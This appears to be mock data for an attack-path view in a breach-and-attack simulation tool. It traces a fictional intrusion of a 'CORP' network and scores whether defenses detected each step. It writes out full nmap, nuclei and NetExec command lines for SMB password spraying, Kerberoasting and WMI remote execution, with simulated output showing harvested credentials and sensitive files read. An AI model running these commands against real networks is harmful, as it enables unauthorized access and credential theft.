  attack_path_nodes: [
    // ── 8 active ASSET nodes (used in attack path) ────────────────────────────
    { node_id:'cs-ep01', node_type:'ASSET', node_label:'CORP-WEB-01', node_hostname:'CORP-WEB-01',
      node_ip:'10.20.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'DMZ', node_subnet:'10.20.0.0/24', node_is_entry_point:true,
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_credentials_found:['webadmin:Welcome1!'], node_accessed_files:['/etc/nginx/nginx.conf'] },
    { node_id:'cs-ep02', node_type:'ASSET', node_label:'CORP-APP-01', node_hostname:'CORP-APP-01',
      node_ip:'10.20.1.10', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'App Tier', node_subnet:'10.20.1.0/24', node_is_pivot:true,
      node_user_privileges:'CORP\\svc_app (Service Account)',
      node_agents:['palo_alto', 'openaev'],
      node_credentials_found:['CORP\\svc_app:AppSvc2024!','CORP\\svc_db:DbPass2024!'] },
    { node_id:'cs-ep03', node_type:'ASSET', node_label:'CORP-DB-01', node_hostname:'CORP-DB-01',
      node_ip:'10.20.1.20', node_platform:'Windows Server 2022', node_status:'undetected',
      node_zone:'DB Tier', node_subnet:'10.20.1.0/24',
      node_user_privileges:'sa (SQL Server System Administrator)',
      node_agents:['openaev'],
      node_credentials_found:['sa:Sql@dm1n2024','CORP\\Administrator:CorpAdmin!2024'] },
    { node_id:'cs-ep04', node_type:'ASSET', node_label:'CORP-JUMP-01', node_hostname:'CORP-JUMP-01',
      node_ip:'10.20.2.5', node_platform:'Windows Server 2022', node_status:'undetected',
      node_zone:'Management', node_subnet:'10.20.2.0/24', node_is_pivot:true,
      node_agents:['palo_alto', 'sentinel_one'],
      node_user_privileges:'CORP\\Administrator (Domain Admin)' },
    { node_id:'cs-ep05', node_type:'ASSET', node_label:'CORP-WS-01', node_hostname:'CORP-WS-01',
      node_ip:'10.20.3.10', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Workstations', node_subnet:'10.20.3.0/24',
      node_user_privileges:'CORP\\jdoe (Standard User)',
      node_agents:['palo_alto'],
      node_accessed_files:['C:\\Users\\jdoe\\Documents\\Budget_2026.xlsx'] },
    { node_id:'cs-ep06', node_type:'ASSET', node_label:'CORP-WS-02', node_hostname:'CORP-WS-02',
      node_ip:'10.20.3.11', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Workstations', node_subnet:'10.20.3.0/24',
      node_user_privileges:'CORP\\asmith (Power User)',
      node_agents:['palo_alto'],
      node_credentials_found:['CORP\\asmith:Smith@2024'] },
    { node_id:'cs-ep07', node_type:'ASSET', node_label:'CORP-DC-01', node_hostname:'CORP-DC-01',
      node_ip:'10.20.4.5', node_platform:'Windows Server 2022', node_status:'prevented',
      node_zone:'Core', node_subnet:'10.20.4.0/24',
      node_agents:['sentinel_one', 'openaev'],
      node_user_privileges:'CORP\\krbtgt (Domain Controller)' },
    { node_id:'cs-ep08', node_type:'ASSET', node_label:'CORP-FILE-01', node_hostname:'CORP-FILE-01',
      node_ip:'10.20.1.30', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'File Share', node_subnet:'10.20.1.0/24',
      node_agents:['sentinel_one', 'openaev'],
      node_accessed_files:['\\\\CORP-FILE-01\\Finance\\Q4_Projections.xlsx','\\\\CORP-FILE-01\\HR\\Salaries_2026.xlsx'] },
    // ── 7 discovered-but-not-attacked ASSET nodes ─────────────────────────────
    { node_id:'cs-ep09', node_type:'ASSET', node_label:'CORP-PRINT-01', node_hostname:'CORP-PRINT-01', node_ip:'10.20.5.10', node_platform:'Windows 10', node_status:'pending', node_zone:'Printers', node_subnet:'10.20.5.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'cs-ep10', node_type:'ASSET', node_label:'CORP-VOIP-01', node_hostname:'CORP-VOIP-01', node_ip:'10.20.5.20', node_platform:'Linux (VoIP)', node_status:'pending', node_zone:'VoIP', node_subnet:'10.20.5.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'cs-ep11', node_type:'ASSET', node_label:'CORP-CAM-01', node_hostname:'CORP-CAM-01', node_ip:'10.20.5.30', node_platform:'Linux (IoT)', node_status:'pending', node_zone:'IoT', node_subnet:'10.20.5.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'cs-ep12', node_type:'ASSET', node_label:'CORP-KIOSK-01', node_hostname:'CORP-KIOSK-01', node_ip:'10.20.6.10', node_platform:'Windows 10 IoT', node_status:'pending', node_zone:'Kiosks', node_subnet:'10.20.6.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'cs-ep13', node_type:'ASSET', node_label:'CORP-TEST-01', node_hostname:'CORP-TEST-01', node_ip:'10.20.6.20', node_platform:'Ubuntu 20.04 LTS', node_status:'pending', node_zone:'Test', node_subnet:'10.20.6.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'cs-ep14', node_type:'ASSET', node_label:'CORP-DEV-01', node_hostname:'CORP-DEV-01', node_ip:'10.20.6.30', node_platform:'macOS Ventura 13.6', node_status:'pending', node_zone:'Dev', node_subnet:'10.20.6.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'cs-ep15', node_type:'ASSET', node_label:'CORP-MGMT-01', node_hostname:'CORP-MGMT-01', node_ip:'10.20.2.50', node_platform:'Windows Server 2019', node_status:'pending', node_zone:'Management', node_subnet:'10.20.2.0/24', node_untouched:true, node_agents:['openaev'], },

    // ── Nmap discovery actions (initial recon) ────────────────────────────────
    { node_id:'cs-act-nmap01', node_type:'ACTION', node_label:'Nmap Host Discovery — 10.20.0.0/24',
      node_status:'undetected', node_payload_name:'nmap – Host Discovery',
      node_command:'nmap', node_arguments:'-sn -T4 10.20.0.0/24',
      node_executed_at:'2026-06-14T06:00:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs-e-nmap01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for CORP-WEB-01 (10.20.0.10)
Host is up (0.0012s latency).
Nmap scan report for CORP-APP-01 (10.20.1.10)
Host is up (0.0018s latency).
Nmap scan report for CORP-DB-01 (10.20.1.20)
Host is up (0.0021s latency).
Nmap scan report for CORP-JUMP-01 (10.20.2.5)
Host is up (0.0019s latency).
Nmap scan report for CORP-WS-01 (10.20.3.10)
Host is up (0.0014s latency).
Nmap scan report for CORP-WS-02 (10.20.3.11)
Host is up (0.0015s latency).
Nmap scan report for CORP-DC-01 (10.20.4.5)
Host is up (0.0022s latency).
Nmap scan report for CORP-FILE-01 (10.20.1.30)
Host is up (0.0016s latency).
Nmap done: 15 IP addresses (15 hosts up) scanned in 12.34s` },

    { node_id:'cs-act-nmap02', node_type:'ACTION', node_label:'Nmap Service Scan — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – Service Scan',
      node_command:'nmap', node_arguments:'-sS -sV -T4 -p 22,80,443,8080,8443,3000 10.20.0.10',
      node_executed_at:'2026-06-14T06:08:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs-e-nmap02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Starting Nmap 7.95 ( https://nmap.org )
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1
80/tcp   open  http      nginx 1.24.0
443/tcp  open  ssl/https nginx 1.24.0
3000/tcp open  http      Grafana 9.5.2
8080/tcp open  http      Jenkins 2.401.3
8443/tcp closed https-alt
Nmap done: 1 IP address (1 host up) scanned in 4.22s`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.9p1 Ubuntu', '80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '3000/tcp open http Grafana 9.5.2', '8080/tcp open http Jenkins 2.401.3'] },

    // ── Nuclei CVE scan ──────────────────────────────────────────────────────
    { node_id:'cs-act-nuclei01', node_type:'ACTION', node_label:'Nuclei CVE Scan — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nuclei – Multi-CVE Web Scan',
      node_command:'nuclei', node_arguments:'-u http://10.20.0.10 -t cves/ -severity high,critical',
      node_executed_at:'2026-06-14T06:20:00Z', node_agent:'sentinel_one', node_ip:'10.20.0.10',
      node_credentials_found:['webadmin:Welcome1!'],
      node_accessed_files:['/etc/nginx/nginx.conf'],
      node_expectations:[{expectation_id:'cs-e-nuclei01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[INF] nuclei - Fast and customisable vulnerability scanner
[2026-06-14 06:20:15] [CVE-2023-41425] [http] [high] http://10.20.0.10 — Grafana path traversal
[2026-06-14 06:20:22] [CVE-2023-27898] [http] [critical] http://10.20.0.10:8080 — Jenkins RCE
[+] Jenkins script console accessible without auth
[+] Extracted credential from jenkins config: webadmin:Welcome1!`,
      node_cves_found:['CVE-2023-27898 (Jenkins RCE unauthenticated) - CRITICAL', 'CVE-2023-41425 (Grafana path traversal) - HIGH', 'CVE-2022-25845 (Fastjson RCE) - HIGH'] },

    // ── NetExec SMB Credential Spray — SAME ACTION, 12 DIFFERENT username:password combinations ──
    // Run 1: admin:admin (FAIL)
    { node_id:'cs-act-spray01', node_type:'ACTION', node_label:'NetExec SMB Spray — admin:admin',
      node_status:'prevented', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u admin -p admin --no-bruteforce',
      node_executed_at:'2026-06-14T06:35:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray01',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\admin:admin STATUS_LOGON_FAILURE
SMB    10.20.1.20  445  CORP-DB-01   [-] CORP\\admin:admin STATUS_LOGON_FAILURE
[!] DETECTION: Windows Security Event 4625 — Failed logon (admin) flagged by SIEM` },

    // Run 2: administrator:Password1 (FAIL)
    { node_id:'cs-act-spray02', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:Password1',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u administrator -p Password1 --no-bruteforce',
      node_executed_at:'2026-06-14T06:37:00Z', node_agent:'openaev', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\administrator:Password1 STATUS_LOGON_FAILURE
SMB    10.20.1.20  445  CORP-DB-01   [-] CORP\\administrator:Password1 STATUS_LOGON_FAILURE` },

    // Run 3: svc_app:Summer2024! (FAIL)
    { node_id:'cs-act-spray03', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Summer2024!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u svc_app -p Summer2024! --no-bruteforce',
      node_executed_at:'2026-06-14T06:39:00Z', node_agent:'openaev', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Summer2024! STATUS_LOGON_FAILURE
SMB    10.20.1.20  445  CORP-DB-01   [-] CORP\\svc_app:Summer2024! STATUS_LOGON_FAILURE` },

    // Run 4: svc_app:AppSvc2024! (SUCCESS — valid credential!)
    { node_id:'cs-act-spray04', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:AppSvc2024! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u svc_app -p AppSvc2024! --shares',
      node_executed_at:'2026-06-14T06:42:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.10',
      node_credentials_found:['CORP\\svc_app:AppSvc2024!','CORP\\svc_db:DbPass2024!'],
      node_accessed_files:['C:\\AppServer\\web.config','C:\\AppServer\\appsettings.json'],
      node_expectations:[{expectation_id:'cs-e-spray04',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [+] CORP\\svc_app:AppSvc2024! (Pwn3d!)
SMB    10.20.1.10  445  CORP-APP-01  [+] SHARE: C$, IPC$, AppData
SMB    10.20.1.10  445  CORP-APP-01  [+] web.config: svc_db:DbPass2024!
SMB    10.20.1.10  445  CORP-APP-01  [+] appsettings.json: connection string extracted` },

    // Run 5: svc_db:DbPass2024! on DB server (SUCCESS)
    { node_id:'cs-act-spray05', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_db:DbPass2024! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.20 -u svc_db -p DbPass2024! --shares',
      node_executed_at:'2026-06-14T06:50:00Z', node_agent:'palo_alto', node_ip:'10.20.1.20',
      node_credentials_found:['sa:Sql@dm1n2024'],
      node_accessed_files:['C:\\Program Files\\Microsoft SQL Server\\MSSQL\\DATA\\master.mdf'],
      node_expectations:[{expectation_id:'cs-e-spray05',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.20  445  CORP-DB-01  [*] Windows Server 2022 x64
SMB    10.20.1.20  445  CORP-DB-01  [+] CORP\\svc_db:DbPass2024! (Pwn3d!)
SMB    10.20.1.20  445  CORP-DB-01  [+] SHARE: C$, ADMIN$, SQLData
MSSQL  10.20.1.20  1433 CORP-DB-01  [+] sa:Sql@dm1n2024 — SQL Server login successful
MSSQL  10.20.1.20  1433 CORP-DB-01  [+] xp_cmdshell enabled — OS command execution available` },

    // Run 6: administrator:CorpAdmin!2024 on jump server (SUCCESS)
    { node_id:'cs-act-spray06', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:CorpAdmin!2024 ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.2.5 -u administrator -p "CorpAdmin!2024" --shares',
      node_executed_at:'2026-06-14T07:05:00Z', node_agent:'sentinel_one', node_ip:'10.20.2.5',
      node_user_privileges:'CORP\\Administrator (Domain Admin)',
      node_expectations:[{expectation_id:'cs-e-spray06',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.2.5  445  CORP-JUMP-01  [*] Windows Server 2022 x64
SMB    10.20.2.5  445  CORP-JUMP-01  [+] CORP\\administrator:CorpAdmin!2024 (Pwn3d!)
SMB    10.20.2.5  445  CORP-JUMP-01  [+] ADMIN$ accessible — full control
SMB    10.20.2.5  445  CORP-JUMP-01  [*] RDP also accessible on port 3389` },

    // Run 7: jdoe:Welcome1! on workstation (SUCCESS)
    { node_id:'cs-act-spray07', node_type:'ACTION', node_label:'NetExec SMB Spray — jdoe:Welcome1! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.3.10 -u jdoe -p Welcome1! --shares',
      node_executed_at:'2026-06-14T07:15:00Z', node_agent:'openaev', node_ip:'10.20.3.10',
      node_user_privileges:'CORP\\jdoe (Standard User)',
      node_accessed_files:['C:\\Users\\jdoe\\Documents\\Budget_2026.xlsx'],
      node_expectations:[{expectation_id:'cs-e-spray07',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.3.10  445  CORP-WS-01  [*] Windows 11 x64
SMB    10.20.3.10  445  CORP-WS-01  [+] CORP\\jdoe:Welcome1! (Pwn3d!)
SMB    10.20.3.10  445  CORP-WS-01  [+] SHARE: C$, Users
SMB    10.20.3.10  445  CORP-WS-01  [+] Budget_2026.xlsx found — sensitive financial data` },

    // Run 8: asmith:Smith@2024 on WS-02 (DETECTED)
    { node_id:'cs-act-spray08', node_type:'ACTION', node_label:'NetExec SMB Spray — asmith:Smith@2024',
      node_status:'detected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.3.11 -u asmith -p "Smith@2024" --shares',
      node_executed_at:'2026-06-14T07:20:00Z', node_agent:'palo_alto', node_ip:'10.20.3.11',
      node_user_privileges:'CORP\\asmith (Power User)',
      node_credentials_found:['CORP\\asmith:Smith@2024'],
      node_expectations:[{expectation_id:'cs-e-spray08',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.3.11  445  CORP-WS-02  [*] Windows 11 x64
SMB    10.20.3.11  445  CORP-WS-02  [+] CORP\\asmith:Smith@2024 (Pwn3d!)
SMB    10.20.3.11  445  CORP-WS-02  [+] SHARE: C$
[!] DETECTION: CrowdStrike EDR detected lateral movement from CORP-APP-01 to CORP-WS-02
[!] Alert: SMB_LATERAL_MOVEMENT triggered` },

    // Run 9: krbtgt attempt on DC (PREVENTED)
    { node_id:'cs-act-spray09', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:DCAdmin2024! (DC)',
      node_status:'prevented', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.4.5 -u administrator -p DCAdmin2024! --shares',
      node_executed_at:'2026-06-14T07:30:00Z', node_agent:'palo_alto', node_ip:'10.20.4.5',
      node_expectations:[{expectation_id:'cs-e-spray09',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.4.5  445  CORP-DC-01  [*] Windows Server 2022 x64
SMB    10.20.4.5  445  CORP-DC-01  [-] CORP\\administrator:DCAdmin2024! STATUS_LOGON_FAILURE
[!] PREVENTION: Microsoft Defender for Identity blocked auth attempt from CORP-JUMP-01 to DC
[!] Alert: SUSPICIOUS_SMB_TO_DC — account lockout policy triggered` },

    // Run 10: file server access with admin creds (SUCCESS)
    { node_id:'cs-act-spray10', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:CorpAdmin!2024 (File Server) ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.30 -u administrator -p "CorpAdmin!2024" --shares',
      node_executed_at:'2026-06-14T07:40:00Z', node_agent:'openaev', node_ip:'10.20.1.30',
      node_user_privileges:'CORP\\Administrator (Domain Admin)',
      node_accessed_files:['\\\\CORP-FILE-01\\Finance\\Q4_Projections.xlsx','\\\\CORP-FILE-01\\HR\\Salaries_2026.xlsx'],
      node_expectations:[{expectation_id:'cs-e-spray10',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.30  445  CORP-FILE-01  [*] Windows Server 2019 x64
SMB    10.20.1.30  445  CORP-FILE-01  [+] CORP\\administrator:CorpAdmin!2024 (Pwn3d!)
SMB    10.20.1.30  445  CORP-FILE-01  [+] SHARE: Finance, HR, IT, C$
SMB    10.20.1.30  445  CORP-FILE-01  [+] Finance\\Q4_Projections.xlsx — read
SMB    10.20.1.30  445  CORP-FILE-01  [+] HR\\Salaries_2026.xlsx — read` },

    // Run 11: LDAP Kerberoasting (different NetExec module — same payload type)
    { node_id:'cs-act-spray11', node_type:'ACTION', node_label:'NetExec LDAP Kerberoasting — svc_app:AppSvc2024!',
      node_status:'detected', node_payload_name:'netexec – LDAP Kerberoasting',
      node_command:'netexec', node_arguments:'ldap 10.20.4.5 -u svc_app -p AppSvc2024! --kerberoasting',
      node_executed_at:'2026-06-14T07:50:00Z', node_agent:'sentinel_one', node_ip:'10.20.4.5',
      node_credentials_found:['CORP\\krbtgt:$HASH$AES256'],
      node_expectations:[{expectation_id:'cs-e-spray11',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`LDAP   10.20.4.5  389  CORP-DC-01  [*] Windows Server 2022 x64
LDAP   10.20.4.5  389  CORP-DC-01  [*] Using service account: svc_app
LDAP   10.20.4.5  389  CORP-DC-01  [+] sAMAccountName: svc_mssql  spnValue: MSSQLSvc/CORP-DB-01
LDAP   10.20.4.5  389  CORP-DC-01  $krbtgt$23$*svc_mssql*CORP.LOCAL*MSSQLSvc/CORP-DB-01*...
[!] DETECTION: Kerberoasting activity flagged by SIEM (Event ID 4769 bulk)` },

    // Run 12: WMI exec on jump server
    { node_id:'cs-act-spray12', node_type:'ACTION', node_label:'NetExec WMI Exec — administrator:CorpAdmin!2024 ✓',
      node_status:'undetected', node_payload_name:'netexec – WMI remote exec',
      node_command:'netexec', node_arguments:'wmi 10.20.2.5 -u administrator -p "CorpAdmin!2024" -x "whoami /all"',
      node_executed_at:'2026-06-14T08:00:00Z', node_agent:'palo_alto', node_ip:'10.20.2.5',
      node_user_privileges:'CORP\\Administrator (Domain Admin)',
      node_credentials_found:['CORP\\Administrator:CorpAdmin!2024'],
      node_expectations:[{expectation_id:'cs-e-spray12',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`WMI    10.20.2.5  445  CORP-JUMP-01  [*] Windows Server 2022 x64
WMI    10.20.2.5  445  CORP-JUMP-01  [+] CORP\\administrator:CorpAdmin!2024 (Pwn3d!)
WMI    10.20.2.5  445  CORP-JUMP-01  [*] NT AUTHORITY\\SYSTEM
WMI    10.20.2.5  445  CORP-JUMP-01  [+] whoami: CORP\\ADMINISTRATOR
WMI    10.20.2.5  445  CORP-JUMP-01  [+] Domain: CORP.LOCAL (Domain Admin level)` },
    // ── Multi-variant: same SMB spray action on CORP-APP-01 (cs-ep02) with different credentials ──
    { node_id:'cs-act-spray13', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:AppSvc2023!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p AppSvc2023! --no-bruteforce',
      node_executed_at:'2026-06-14T06:44:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray13',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:AppSvc2023! STATUS_LOGON_FAILURE` },
    { node_id:'cs-act-spray14', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:P@ssw0rd',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p P@ssw0rd --no-bruteforce',
      node_executed_at:'2026-06-14T06:46:00Z', node_agent:'openaev', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray14',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:P@ssw0rd STATUS_LOGON_FAILURE` },
    { node_id:'cs-act-spray15', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Welcome123!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p Welcome123! --no-bruteforce',
      node_executed_at:'2026-06-14T06:47:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray15',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Welcome123! STATUS_LOGON_FAILURE` },
    { node_id:'cs-act-spray16', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Corp@2024',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p Corp@2024 --no-bruteforce',
      node_executed_at:'2026-06-14T06:48:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray16',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Corp@2024 STATUS_LOGON_FAILURE` },
    { node_id:'cs-act-spray17', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Qwerty2024!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p Qwerty2024! --no-bruteforce',
      node_executed_at:'2026-06-14T06:49:30Z', node_agent:'sentinel_one', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs-e-spray17',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Qwerty2024! STATUS_LOGON_FAILURE` },
    // ── Multi-variant: nmap scans on CORP-WEB-01 (cs-ep01) with different port ranges ──
    { node_id:'cs-act-nmap03', node_type:'ACTION', node_label:'Nmap UDP Scan — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – UDP Scan',
      node_command:'nmap', node_arguments:'-sU -T4 -p 53,161,500,4500 10.20.0.10',
      node_executed_at:'2026-06-14T06:10:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs-e-nmap03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 53/udp dns open, 161/udp snmp open (community: public)`,
      node_ports_found:['53/udp open domain dnsmasq 2.89', '123/udp open ntp', '161/udp open snmp (community: public)'] },
    { node_id:'cs-act-nmap04', node_type:'ACTION', node_label:'Nmap Script Scan — CORP-WEB-01',
      node_status:'detected', node_payload_name:'nmap – Script Scan',
      node_command:'nmap', node_arguments:'-sC -sV --script=http-headers,http-title 10.20.0.10',
      node_executed_at:'2026-06-14T06:12:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs-e-nmap04',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`[!] DETECTION: IDS alert — nmap script scan detected from 192.168.100.50`,
      node_ports_found:['80/tcp open http nginx 1.24.0', '443/tcp open ssl/https', '8080/tcp open http Jenkins 2.401.3'],
      node_cves_found:['CVE-2023-27898 (Jenkins RCE unauthenticated) - CRITICAL', 'CVE-2023-41425 (Grafana path traversal) - HIGH'] },
    { node_id:'cs-act-nmap05', node_type:'ACTION', node_label:'Nmap OS Detection — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – OS Detection',
      node_command:'nmap', node_arguments:'-O --osscan-guess 10.20.0.10',
      node_executed_at:'2026-06-14T06:14:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs-e-nmap05',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`OS guess: Linux 5.15 (kernel 5.15.0-94-generic) — 98% accuracy`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.9p1', '80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '8080/tcp open http Jenkins 2.401.3'] },
  ],
  attack_path_edges: [
    // Asset links — spray actions to target endpoints
    { edge_id:'cs-al-nmap01', edge_type:'asset_link', edge_source:'cs-act-nmap01', edge_target:'cs-ep01' },
    { edge_id:'cs-al-nmap02', edge_type:'asset_link', edge_source:'cs-act-nmap02', edge_target:'cs-ep01' },
    { edge_id:'cs-al-nmap03', edge_type:'asset_link', edge_source:'cs-act-nmap03', edge_target:'cs-ep01' },
    { edge_id:'cs-al-nmap04', edge_type:'asset_link', edge_source:'cs-act-nmap04', edge_target:'cs-ep01' },
    { edge_id:'cs-al-nmap05', edge_type:'asset_link', edge_source:'cs-act-nmap05', edge_target:'cs-ep01' },
    { edge_id:'cs-al-nuclei01', edge_type:'asset_link', edge_source:'cs-act-nuclei01', edge_target:'cs-ep01' },
    { edge_id:'cs-al-spray01', edge_type:'asset_link', edge_source:'cs-act-spray01', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray02', edge_type:'asset_link', edge_source:'cs-act-spray02', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray03', edge_type:'asset_link', edge_source:'cs-act-spray03', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray04', edge_type:'asset_link', edge_source:'cs-act-spray04', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray13', edge_type:'asset_link', edge_source:'cs-act-spray13', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray14', edge_type:'asset_link', edge_source:'cs-act-spray14', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray15', edge_type:'asset_link', edge_source:'cs-act-spray15', edge_target:'cs-ep02' },
